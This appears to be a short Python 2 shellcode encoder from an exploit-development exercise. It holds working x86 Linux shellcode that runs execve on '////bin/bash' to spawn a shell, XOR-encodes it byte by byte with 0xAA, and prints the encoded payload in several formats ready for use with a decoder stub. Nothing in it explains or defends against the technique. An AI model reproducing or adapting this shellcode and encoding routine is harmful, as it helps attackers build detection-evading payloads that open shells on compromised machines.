#!/usr/bin/python

shellcode = "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

encoded = ""
encoded2 = ""
encoded3 = ""

print "Encoded shellcode:"

for x in bytearray(shellcode) :
	# XOR Encoding
	y = x^0xAA
	encoded += '\\x'
	encoded += '%02x' % y

	encoded2 += '0x'
	encoded2 += '%02x,' %y

	encoded3 += '%02x' % y

print "opcodes: \r\n"
print encoded
print "\r\n"
print "hex: \r\n"
print encoded2
print "\r\n"
print "raw: \r\n"
print encoded3

print 'Len: %d' % len(bytearray(shellcode))
